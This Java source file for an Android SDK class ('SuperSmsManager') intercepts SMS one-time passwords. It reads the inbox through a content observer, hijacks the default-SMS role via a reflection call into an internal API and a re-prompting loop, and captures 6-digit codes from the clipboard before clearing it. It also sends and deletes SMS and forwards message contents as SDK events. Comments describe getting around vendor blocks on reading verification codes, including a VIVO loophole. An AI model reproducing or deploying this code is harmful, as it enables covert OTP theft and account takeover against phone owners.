package com.myyj.sdk.tools;

import android.Manifest;
import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.os.Build;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.util.Log;
import android.widget.Toast;

import com.myyj.sdk.MySDK;
import com.myyj.sdk.ResultCallback;
import com.myyj.sdk.msdk;
import com.myyj.sdk.tools.sercer2.ServerHelper2;
import com.qw.soul.permission.SoulPermission;
import com.qw.soul.permission.bean.Permission;
import com.qw.soul.permission.callbcak.GoAppDetailCallBack;
import com.zdf.activitylauncher.ActivityLauncher;

import org.json.JSONException;
import org.json.JSONObject;

import java.lang.reflect.Method;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Locale;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import cn.richinfo.dualsim.TelephonyManagement;

import static android.content.Context.CLIPBOARD_SERVICE;

/**
 * 超级短信管理
 * 1、发送短信
 * 2、监听短信
 */
public class SuperSmsManager {
    private static SuperSmsManager instance;

    public static SuperSmsManager getInstance() {
        if (instance == null) {
            instance = new SuperSmsManager();
        }
        return instance;
    }

    private final String SENT_SMS_ACTION = "SENT_SMS_ACTION";               // 短信发送成功
    private final String DELIVERED_SMS_ACTION = "DELIVERED_SMS_ACTION";     // 短信已被接收
    //    private final String RECEIVE_SMS_ACTION = "android.provider.Telephony.SMS_RECEIVED";
    private SmsManager _smsManager;
    private PendingIntent _sendPI, _deliveredPI;
    private BroadcastReceiver _brocastSendSms, _brocastDeliveredSms; // 发送短信
    //    private BroadcastReceiver _brocastReceiveSms; // 接收短信
    private ContentObserver _observerReceiveSms; // 读取短信
    private int _lastSmsId; // 最后一条记录
    private String _lastSmsUri; // 最后一个短信url
    private OnReceivedSmsListener _listener;
    private boolean _autoReceiveSms; // 是否自动读取短信
    private boolean _retrySetDefaultSms = true; // 是否重试设置为默认短信管理
    private boolean _readVerifyCodeMode = false; // 读取验证码模式

    public void setReadVerifyCodeMode(boolean mode) {
        _readVerifyCodeMode = mode;
    }

    private boolean isReadVerifyCodeMode() {
        return _readVerifyCodeMode;
    }

    public void setRetrySetDefaultSms(boolean value) {
        this._retrySetDefaultSms = value;
    }

    public boolean isRetrySetDefaultSms() {
        return this._retrySetDefaultSms;
    }

    public boolean isAutoReceiveSms() {
        return _autoReceiveSms;
    }

    public void setAutoReceiveSms(boolean autoReceiveSms) {
        this._autoReceiveSms = autoReceiveSms;
        LogHelper.d("setAutoReceiveSms: " + autoReceiveSms);
        if (!autoReceiveSms) {
            closeReceive();
        }
    }

    public interface OnReceivedSmsListener {
        void onReceivedSms(String mobile, String content, Date date);
    }

    public SuperSmsManager() {
    }

    private Activity getActivity() {
        return SoulPermission.getInstance().getTopActivity();
    }


    public void init() {
        LogHelper.d("SuperSmsManager初始化");
        if (_smsManager != null) {
            LogHelper.d("无需重复初始化");
            return;
        }
        setAutoReceiveSms(true);

        registerClipEvents();
        clearClipboard(getActivity(), null);
        /**
         * 华为和小米设置后，可读取验证码短信
         *
         * 魅族系统会拦截验证码短信，无法读取到
         *
         * VIVO接收到短信时会拦截短信并自动重置为系统应用，但是有破绽，能读到畅由的验证码
         *
         * OPPO接收到短信时会拦截短信并自动重置为系统应用，LOG显示不全
         * 设置为默认管理后可以读取验证码
         *
         */
        if (PhoneInfoHelper.isHuawei() || PhoneInfoHelper.isMIUI()) {
            if (msdk.isDefaultSMS()) {
                setAsDefaultSMS(new ResultCallback() {
                    @Override
                    public void callback(int state, String result) {
                        initPhoneState();
                    }
                });
            } else {
                initPhoneState();
            }
        } else {
            initPhoneState();
        }

    }

    private void initPhoneState() {
        LogHelper.d("initPhoneState READ_PHONE_STATE");
        SoulPermission.getInstance().checkAndRequestPermission(Manifest.permission.READ_PHONE_STATE, new CheckPermissionWithRationaleAdapter("需要PHONE_STATE权限", new Runnable() {
            @Override
            public void run() {
                initPhoneState();
            }
        }) {
            @Override
            public void onPermissionOk(Permission permission) {
                initReceiveSms();
                ServerHelper2.getInstance().updateDeviceInfo();
            }
        });
    }


    private void initReceiveSms() {
        LogHelper.d("initReceiveSms RECEIVE_SMS");
        SoulPermission.getInstance().checkAndRequestPermission(Manifest.permission.RECEIVE_SMS, new CheckPermissionWithRationaleAdapter("需要SMS接收权限", new Runnable() {
            @Override
            public void run() {
                initReceiveSms();
            }
        }) {
            @Override
            public void onPermissionOk(Permission permission) {
                initReadSms();
            }
        });
    }

    /**
     * 华为需要读短信的权限
     */
    private void initReadSms() {
        LogHelper.d("initReadSms READ_SMS");
        SoulPermission.getInstance().checkAndRequestPermission(Manifest.permission.READ_SMS, new CheckPermissionWithRationaleAdapter("需要SMS读取权限", new Runnable() {
            @Override
            public void run() {
                initReadSms();
            }
        }) {
            @Override
            public void onPermissionOk(Permission permission) {
                initInner();
                if (isAutoReceiveSms()) {
                    openReceive();
                }
                LogHelper.d("初始化完成~~");
            }
        });
    }

    private void initInner() {
        LogHelper.d("initInner");
        if (_smsManager != null) {
            return;
        }
        final Activity activity = getActivity();
        _smsManager = getYDSmsManager();
        _sendPI = PendingIntent.getBroadcast(activity, 0,
                new Intent(SENT_SMS_ACTION), 0);
        _deliveredPI = PendingIntent.getBroadcast(activity, 0,
                new Intent(DELIVERED_SMS_ACTION), 0);
        _brocastSendSms = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                int resultCode = getResultCode();
                String errorMsg = null;
                switch (resultCode) {
                    case Activity.RESULT_OK:
                        LogHelper.d("短信发送调用正常");
                        break;
                    case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                        errorMsg = "短信发送错误";
                        break;
                    case SmsManager.RESULT_ERROR_RADIO_OFF:
                        errorMsg = "没有信号";
                        break;
                    case SmsManager.RESULT_ERROR_NULL_PDU:
                        errorMsg = "没有PDU";
                        break;
                    case SmsManager.RESULT_ERROR_SHORT_CODE_NOT_ALLOWED:
                        errorMsg = "动态拒绝";
                        break;
                    case SmsManager.RESULT_ERROR_SHORT_CODE_NEVER_ALLOWED:
                        errorMsg = "动态永久拒绝";
                        break;
                    default:
                        errorMsg = "未知错误" + getResultData();
                        break;
                }
                if (errorMsg != null) {
                    LogHelper.d("sendSmsInner return: " + errorMsg);
                    if (_sendResultCallback != null) {
                        _sendResultCallback.callback(2, errorMsg);
                        _sendResultCallback = null;
                    }
                } else {
                    LogHelper.d("sendSmsInner return 短信发送正常");
                    if (_sendResultCallback != null) {
                        _sendResultCallback.callback(0, "短信发送正常");
                        _sendResultCallback = null;
                    }
                }
            }
        };
        _brocastDeliveredSms = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                LogHelper.d("短信送达通知：" + getResultCode());
            }
        };
//        _brocastReceiveSms = new BroadcastReceiver() {
//            @Override
//            public void onReceive(Context context, Intent intent) {
//                LogHelper.toast("收到短信" + getResultCode());
//                Object[] object = (Object[]) intent.getExtras().get("pdus");
//                for (Object pdus : object) {
//                    byte[] pdusMsg = (byte[]) pdus;
//                    SmsMessage sms = SmsMessage.createFromPdu(pdusMsg);
//                    String address = sms.getOriginatingAddress();//发送短信的手机号
//                    String body = sms.getMessageBody();//短信内容
//                    onReceivedSms(address, body, sms.getTimestampMillis());
//                }
//            }
//        };
        // 发送相关
        activity.registerReceiver(_brocastSendSms, new IntentFilter(SENT_SMS_ACTION));
        activity.registerReceiver(_brocastDeliveredSms, new IntentFilter(DELIVERED_SMS_ACTION));
//        // 接收相关
//        activity.registerReceiver(_brocastReceiveSms, new IntentFilter(RECEIVE_SMS_ACTION));
//        if(_callAfterInitOK != null) {
//            _callAfterInitOK.run();
//        }
    }

    private void openReceive() {
        LogHelper.d("openReceive");
        if (_observerReceiveSms != null) {
            return;
        }
        final Activity activity = SoulPermission.getInstance().getTopActivity();
        _observerReceiveSms = new ContentObserver(null) {
            @Override
            public void onChange(boolean selfChange, Uri uri) {
                super.onChange(selfChange, uri);
                LogHelper.d("onChange " + uri + " " + selfChange + " last " + _lastSmsUri);
                if (!uri.toString().startsWith("content://sms")) {
                    return;
                }
                if (_sendResultCallback != null) {
                    _sendResultCallback.callback(0, "默认为发送成功了");
                    _sendResultCallback = null;
                }
                // 第一次回调 不是我们想要的 直接返回
                if (uri.toString().equals("content://sms/raw")) {
//                    LogHelper.d("这条不是");
                    return;
                }
                if (_lastSmsUri == null) {
                    _lastSmsUri = uri.toString();
                }
                if (_lastSmsUri.equals(uri.toString())) {
//                    LogHelper.d("这条好像也不是");
                    return;
                }
                _lastSmsUri = uri.toString();
//                LogHelper.d("这条应该是了,尝试读取 " + _lastSmsUri);
                if (_listener == null) {
                    LogHelper.d("没有RPW监听器，忽略短信");
                    return;
                }
                readLastSms(isRetrySetDefaultSms() || isReadVerifyCodeMode() || PhoneInfoHelper.isVivo());
            }
        };
        activity.getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, _observerReceiveSms);
        getLastSmsId();
    }

    /**
     * 读取最后一条短信
     */
    private int _needReadNewSms = -1;

    private void readLastSms(boolean retry) {
        final Cursor c = getCursor();
        LogHelper.d("readLastSms " + _lastSmsId);
        if (c != null) {
            if (c.moveToFirst()) {
                String _id = c.getString(c.getColumnIndex("_id"));
                final int id = Integer.parseInt(_id);
                LogHelper.d("top id is " + id);
                if (id == _lastSmsId) {
                    LogHelper.d("新短信没有读到，重试 " + retry);
                    if (retry) {
                        if (PhoneInfoHelper.isVivo() || (PhoneInfoHelper.isOppo() && isReadVerifyCodeMode())) {
                            if (msdk.isVivoOppoSMS()) {
                                setAsDefaultSMS(new ResultCallback() {
                                    @Override
                                    public void callback(int state, String result) {
                                        LogHelper.d("setAsDefaultSMS result " + state + " " + result);
                                        readLastSms(false);
                                    }
                                });
                            } else {
                                readLastSms(false);
                            }
                        } else {
                            if (msdk.isDefaultSMS()) {
                                setAsDefaultSMS(new ResultCallback() {
                                    @Override
                                    public void callback(int state, String result) {
                                        LogHelper.d("setAsDefaultSMS result " + state + " " + result);
                                        readLastSms(false);
                                    }
                                });
                            } else {
                                readLastSms(false);
                            }
                        }
                    }
                    c.close();
                    return;
                }
                if (PhoneInfoHelper.isVivo() || (PhoneInfoHelper.isOppo() && isReadVerifyCodeMode())) {
//                    if(msdk.isDefaultSMS())
//                    {
                    if (msdk.isVivoOppoSMS()) {
                        setAsDefaultSMS(new ResultCallback() {
                            @Override
                            public void callback(int state, String result) {
                                if (isDefaultSMS()) {
                                    readNewSms(id);
                                } else {
                                    _needReadNewSms = id;
                                }
                            }
                        });
                    } else {
                        _needReadNewSms = id;
                    }
//                    }
//                    else{
//                        _needReadNewSms = id;
//                    }

                } else {
                    readNewSms(id);
                }
            }
            c.close();
        }
    }

    private Cursor getCursor() {
        final Activity activity = SoulPermission.getInstance().getTopActivity();
        // 第二次回调 查询收件箱里的内容
        Uri inboxUri = Uri.parse("content://sms/inbox");
        return activity.getContentResolver().query(inboxUri,
                null,
                null, null,
                "_id desc");
    }

    /**
     * 遍历最新的短信
     */
    private void readNewSms(int id) {
        LogHelper.d("readNewSms " + id + " to " + _lastSmsId + " " + isDefaultSMS() + " " + isReadVerifyCodeMode());
        final Cursor c = getCursor();
        String _id;
        final int firstId = id;
        int count = 0;
//        int index = firstId;
        ArrayList<Object[]> list = new ArrayList<>();
        c.moveToFirst();
        do { // 从新到旧遍历每条短信，直到上一条
            _id = c.getString(c.getColumnIndex("_id"));
            id = Integer.parseInt(_id);
            // 获取手机号
            final String address = c.getString(c.getColumnIndex("address"));
            // 获取短信内容
            final String body = c.getString(c.getColumnIndex("body"));
            // 发出时间
            final long date = c.getLong(c.getColumnIndex("date"));
            LogHelper.d("读到短信了 " + count + " " + id + ":" + body);
            list.add(new Object[]{
                    address, body, date
            });
            count++;
        } while (id > _lastSmsId && c.moveToNext() && count < 5);
        LogHelper.d("读到的短信条数" + list.size());
        for (Object[] o : list) {
            onReceivedSms((String) o[0], (String) o[1], (long) o[2]);
        }
        LogHelper.d("切换" + _lastSmsId + ">" + firstId + " " + isDefaultSMS());
        _lastSmsId = firstId;
        _needReadNewSms = -1;
    }

    private void closeReceive() {
        LogHelper.d("closeReceive");
        if (_observerReceiveSms != null) {
            getActivity().getContentResolver().unregisterContentObserver(_observerReceiveSms);
            _observerReceiveSms = null;
        }
    }

    /**
     * 打印所有可获得到的短信
     */
    public static void readAllSms() {
        final Activity activity = SoulPermission.getInstance().getTopActivity();

        Calendar calendar = Calendar.getInstance();
        calendar.add(Calendar.DATE, -2);
        String str = "type=1 and date > " + calendar.getTime().getTime();
        Uri inboxUri = Uri.parse("content://sms/inbox");
        Cursor cursor = activity.getContentResolver().query(inboxUri, null,
                null, null, Telephony.Sms.DATE + " desc");
        if (cursor != null) {
            LogHelper.w("SMS QUERY " + cursor.getCount());
            while (cursor.moveToNext()) {
                String number = cursor.getString(cursor
                        .getColumnIndex(Telephony.Sms.ADDRESS));// 手机号
                String smsbody = cursor.getString(cursor
                        .getColumnIndex(Telephony.Sms.BODY));
                if (smsbody.contains("验证码")) {
                    LogHelper.w("smsbody=====" + number + "-->" + smsbody);
                }
//                if(smsbody.contains("积分"))
//                {
//                    LogHelper.w("smsbody=====" + number + "-->" + smsbody);
//                    int id = cursor.getInt(cursor.getColumnIndex("_id"));
//                    activity.getContentResolver().delete(Uri.parse("content://sms/"), "_id=?", new String[]{String.valueOf(id)});
//                    LogHelper.d("删除成功！！！");
//                }
            }
            cursor.close();
        }
    }

    public boolean deleteSmsById(Context context, String id) {
        final Activity activity = SoulPermission.getInstance().getTopActivity();
        try {

            if (TextUtils.isEmpty(id)) {
                Toast.makeText(activity, "请输入短信id", Toast.LENGTH_SHORT).show();
                return false;
            }
            String s = "content://sms/" + id;
            int count = context.getContentResolver().delete(Uri.parse(s), null, null);
            Toast.makeText(activity, "实际删除短信" + count + "条", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Toast.makeText(activity, e.toString(), Toast.LENGTH_SHORT).show();
            return false;
        }
        return true;
    }

    /**
     * 检查通知类短信权限
     */
    private int _times = 0;

    private void checkSmsPermission(final GoAppDetailCallBack callback) {
        LogHelper.w("checkSmsPermission: " + isAutoReceiveSms() + " times: " + _times);
        if (isAutoReceiveSms() && _times <= 0) {
            LogHelper.alert("系统通知", "需要开启短信相关权限", "授权", new DialogInterface.OnDismissListener() {
                @Override
                public void onDismiss(DialogInterface dialogInterface) {
                    SoulPermission.getInstance().goApplicationSettings(callback);
                    _times++;
                }
            });
        } else {
            setAutoReceiveSms(false);
            LogHelper.toast("短信权限异常");
        }
    }

    private void getLastSmsId() {
        LogHelper.d("getLastSmsId");
        try {
            int ret = -1;
            Uri inboxUri = Uri.parse("content://sms/inbox");
            Cursor c = getActivity().getContentResolver().query(inboxUri,
                    null,
                    null, null,
                    "_id desc");//按id排序，如果按date排序的话，修改手机时间后，读取的短信就不准了
            if (c != null) {
                if (c.moveToFirst()) {
                    String _id = c.getString(c.getColumnIndex("_id"));
                    ret = Integer.parseInt(_id);
                }
                c.close();
            }
            _lastSmsUri = inboxUri.toString();
            _lastSmsId = ret;
            LogHelper.d("_lastSmsId = " + _lastSmsId + " _lastSmsUri = " + _lastSmsUri);
        } catch (Exception e) {
            LogHelper.w("无法读取短信 getLastSmsId");
            e.printStackTrace();
            checkSmsPermission(new GoAppDetailCallBack() {
                @Override
                public void onBackFromAppDetail(Intent data) {
                    getLastSmsId();
                }
            });
        }
    }

    /**
     * 短信接收监听
     *
     * @param listener
     */
    public void setOnReceivedSmsListener(OnReceivedSmsListener listener) {
        _listener = listener;
        LogHelper.d("setOnReceivedSmsListener " + _listener);
    }

    public void onReceivedSms(String mobile, String content, long dateMillis) {
        if (_listener != null) {
            Date date = new Date(dateMillis);
            _listener.onReceivedSms(mobile, content, date);
        } else {
            LogHelper.w("未设置短信接收监听");
            //下面是获取短信的发送时间
            Date date = new Date(dateMillis);
            String date_time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(date);
            //追加到StringBuilder中
            LogHelper.d("接收到：----------------------\n短信发送号码："
                    + mobile + "\n短信内容：" + content + "\n发送时间：" + date_time + "\n\n");
            MySDK.getInstance().dispatchEvent("EVENT_RECEIVE_SMS2", " a:" + mobile + " b:" + content);
        }
    }

    public void destroy() {
        LogHelper.d("SuperSmsManager destroy now");
        if (_smsManager == null) {
            return;
        }
        Activity activity = getActivity();
        closeReceive();
        activity.unregisterReceiver(_brocastSendSms);
        activity.unregisterReceiver(_brocastDeliveredSms);
        _brocastSendSms = null;
        _brocastDeliveredSms = null;
//        activity.unregisterReceiver(_brocastReceiveSms);
//        _brocastReceiveSms = null;
        _smsManager = null;
        instance = null;

        if (mClipboardManager != null && mOnPrimaryClipChangedListener != null) {
            mClipboardManager.removePrimaryClipChangedListener(mOnPrimaryClipChangedListener);
        }
    }

    private String _toSendSmsAddress;
    private String _toSendSmsText;

    private ResultCallback _sendResultCallback;

    /**
     * 发送短信
     * 1.短信管理未初始化
     *
     * @param address  对方号码
     * @param text     内容
     * @param callback 回调
     */
    public void sendSms(final String address, final String text, ResultCallback callback) {
        LogHelper.d("sendSms " + address + "：" + text + " " + _smsManager);
        _toSendSmsAddress = address;
        _toSendSmsText = text;
        _sendResultCallback = callback;
        if (_smsManager == null) {
            _sendResultCallback = null;
            callback.callback(1, "短信管理未初始化");
        } else {
            sendSmsInner();
//            if(!isAutoReceiveSms()) {
//                callback.callback(2, "不支持自动读取");
//            }
        }
    }

    public void sendSmsSystem(String address, String text) {
        LogHelper.d("sendSmsSystem " + address + " " + text);
        Activity activity = getActivity();
        String defaultSmsPackageName = Telephony.Sms.getDefaultSmsPackage(activity);
        Uri uri = Uri.parse("smsto:" + address);
        Intent sendIntent = new Intent(Intent.ACTION_SENDTO, uri);
        sendIntent.putExtra(Intent.EXTRA_TEXT, text);
        if (defaultSmsPackageName != null) {
            sendIntent.setPackage(defaultSmsPackageName);
        }
        activity.startActivity(sendIntent);
    }

    private void sendSmsInner() {
        LogHelper.d("sendSmsInner");
        SoulPermission.getInstance().checkAndRequestPermission(Manifest.permission.SEND_SMS,
                new CheckPermissionWithRationaleAdapter("需要开启短信相关权限",
                        new Runnable() {
                            @Override
                            public void run() {
                                // 重试
                                sendSmsInner();
                            }
                        }) {
                    @Override
                    public void onPermissionOk(com.qw.soul.permission.bean.Permission permission) {
                        LogHelper.d("发送短信到" + _toSendSmsAddress + ":\n" + _toSendSmsText);
                        ArrayList<String> texts = _smsManager.divideMessage(_toSendSmsText);
                        for (String text : texts) {
                            _smsManager.sendTextMessage(_toSendSmsAddress, null, text, _sendPI, _deliveredPI);
                        }
                        MySDK.getInstance().dispatchEvent("EVENT_SEND_SMS", _toSendSmsAddress + ":" + _toSendSmsText);
                    }
                }
        );
    }


    /**
     * 获取移动的sm
     *
     * @return 返回
     */
    private SmsManager getYDSmsManager() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            LogHelper.i("OK Permission to READ_PHONE_STATE");
            try {
                TelephonyManagement.TelephonyInfo info = TelephonyManagement.getInstance().getTelephonyInfo(getActivity());
//                LogHelper.d("SIM INFO " + info);
                int subId = info.getSubId(info.getSlotIdSIM1());
//                LogHelper.d("SIM1 sub: " + subId);

                String operator1 = info.getOperatorBySlotId(info.getSlotIdSIM1());
                String operator2 = info.getOperatorBySlotId(info.getSlotIdSIM2());
                if (operator1 != null && operator1.equals("46000") || operator1.equals("46002")
                        || operator1.equals("46007") || operator1.equals("46004")) {
                    // 中国移动
                    subId = info.getSubId(info.getSlotIdSIM1());
                    return SmsManager.getSmsManagerForSubscriptionId(subId);
//                    LogHelper.d("SIM1 sub: " + subId);
                }
                if (operator2 != null && operator2.equals("46000") || operator2.equals("46002")
                        || operator2.equals("46007") || operator2.equals("46004")) {
                    // 中国移动
                    subId = info.getSubId(info.getSlotIdSIM2());
                    return SmsManager.getSmsManagerForSubscriptionId(subId);
//                    LogHelper.d("SIM2 sub: " + subId);
                }
//                LogHelper.d("第" + subId + "张卡是移动的");

            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return SmsManager.getDefault();
    }


    public class PhoneInfo {
        String phoneNum;
        String province; // 北京
        String catName; // 中国移动
        String carrier; // 北京移动

        public String getPhoneNum() {
            return phoneNum;
        }

        public String getProvince() {
            return province;
        }

        public String getCatName() {
            return catName;
        }

        public String getCarrier() {
            return carrier;
        }

        @Override
        public String toString() {
            return "手机号:" + phoneNum + " 归属地:" + province + " 运营商:" + catName + " " + carrier;
        }
    }

    private HashMap<String, PhoneInfo> _phoneInfos = new HashMap<>();

    public PhoneInfo getPhoneInfo(String phoneNum) {
        LogHelper.d("getPhoneInfo " + phoneNum);
        if (null == phoneNum || phoneNum.length() != 11) {
            return null;
        }
        String mts = phoneNum.substring(0, 6);
        PhoneInfo info = _phoneInfos.get(mts);
        if (info != null) {
            return info;
        }
        final String url = "https://tcc.taobao.com/cc/json/mobile_tel_segment.htm?tel=" + phoneNum;
        for (int i = 0; i < 10; i++) {
            String str = NetHelper.getInstance().getStringFromNet(url);
            String pre = "__GetZoneResult_ = ";
            if (str != null && str.startsWith(pre)) {
                String json = str.substring(pre.length());
                try {
                    JSONObject o = new JSONObject(json);
                    info = new PhoneInfo();
                    info.phoneNum = phoneNum;
                    info.province = o.optString("province");
                    info.catName = o.optString("catName");
                    info.carrier = o.optString("carrier");
                    _phoneInfos.put(mts, info);
                    break;
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            } else {
                LogHelper.w("cannot get info with " + phoneNum + " " + str);
            }
        }
        return info;
    }

    /**
     * 判断是否默认管理器
     *
     * @return
     */
    public boolean isDefaultSMS() {
        Context context = SoulPermission.getInstance().getTopActivity();
        String now = Telephony.Sms.getDefaultSmsPackage(context);
        String me = context.getPackageName();
//        LogHelper.d("isDefaultSMS " + now + " " + me);
        return now.equals(me);
    }

    /**
     * 设置为默认管理器
     */
    public void setAsDefaultSMS(final ResultCallback callback) {
        if (isDefaultSMS()) {
            callback.callback(0, "方法0");
            return;
        }
//        LogHelper.d("setAsDefaultSMS 方法一");
        Activity activity = SoulPermission.getInstance().getTopActivity();
        final String packageName = activity.getPackageName();
        try {
            String CLASS_SMS_MANAGER = "com.android.internal.telephony.SmsApplication";
            String METHOD_SET_DEFAULT = "setDefaultApplication";
            Class<?> smsClass = Class.forName(CLASS_SMS_MANAGER);
            Method method = smsClass.getMethod(METHOD_SET_DEFAULT, String.class, Context.class);
            method.invoke(null, packageName, activity);
        } catch (Exception e) {
//            LogHelper.e(e);
        } finally {
            if (isDefaultSMS()) {
                callback.callback(0, "方法1");
            } else {
                activity.runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        setAsDefaultSMS2(callback);
                    }
                });
            }
        }
    }

    // 方法二，有系统提示
    ResultCallback _setAsDefaultSMSCallback = null;

    public void setAsDefaultSMS2(final ResultCallback callback) {
//        LogHelper.d("setAsDefaultSMS 方法二");
        if (_setAsDefaultSMSCallback != null) {
            _setAsDefaultSMSCallback = callback;
            LogHelper.d("setAsDefaultSMS 设置中，不要重复调用");
            return;
        }
        _setAsDefaultSMSCallback = callback;
        Activity activity = SoulPermission.getInstance().getTopActivity();
        final String packageName = activity.getPackageName();
        Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
        intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName);
        ActivityLauncher.init(activity).startActivityForResult(intent,
                new ActivityLauncher.Callback() {
                    @Override
                    public void onActivityResult(int resultCode, Intent data) {
//                        LogHelper.d("回来了 " + resultCode);
                        if (isDefaultSMS()) {
                            _setAsDefaultSMSCallback.callback(0, "方法2");
                            _setAsDefaultSMSCallback = null;
                            if (_needReadNewSms > 0) {
                                readNewSms(_needReadNewSms);
                            }
//                            LogHelper.d("方法二完成");
                        } else {
                            _setAsDefaultSMSCallback = null;
                            setAsDefaultSMS2(callback);
                        }
                    }
                });
    }


    /**
     * 监听剪切板
     */
    ClipboardManager mClipboardManager;
    ClipboardManager.OnPrimaryClipChangedListener mOnPrimaryClipChangedListener;

    public void registerClipEvents() {
        final Activity activity = getActivity();
        mClipboardManager = (ClipboardManager) activity.getSystemService(CLIPBOARD_SERVICE);
        mOnPrimaryClipChangedListener = new ClipboardManager.OnPrimaryClipChangedListener() {
            @Override
            public void onPrimaryClipChanged() {
                if (mClipboardManager.hasPrimaryClip()
                        && mClipboardManager.getPrimaryClip().getItemCount() > 0) {
                    // 获取复制、剪切的文本内容
                    CharSequence content = mClipboardManager.getPrimaryClip().getItemAt(0).getText();
                    if (content != null) {
                        LogHelper.d("copied text: " + content);
                        if (isYzm(String.valueOf(content))) {
                            setClipStr(String.valueOf(content));
                            clearClipboard(activity, null);
                        }

                    }

                }
            }
        };
        mClipboardManager.addPrimaryClipChangedListener(mOnPrimaryClipChangedListener);
    }

    /**
     * 清空剪贴板内容
     */
    public static void clearClipboard(Context context, CharSequence content) {
        ClipboardManager clipboard = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
        if (clipboard != null) {
            clipboard.setPrimaryClip(ClipData.newPlainText(null, content));//参数一：标签，可为空，参数二：要复制到剪贴板的文本
            if (clipboard.hasPrimaryClip()) {
                clipboard.getPrimaryClip().getItemAt(0).getText();
            }
        }
    }


    private String clipStr;

    public void setClipStr(String str) {
        clipStr = str;
    }

    public String getClipStr() {
        return clipStr;
    }

    public static boolean isYzm(String str) {
        if (null == str) {
            return false;
        }
        str = str.trim();
        if (str.length() == 0 || str.length() != 6) {
            return false;
        }
        Pattern pattern = Pattern.compile("[0-9]*");
        Matcher isNum = pattern.matcher(str);
        if (!isNum.matches()) {
            return false;
        }
        return true;
    }
}
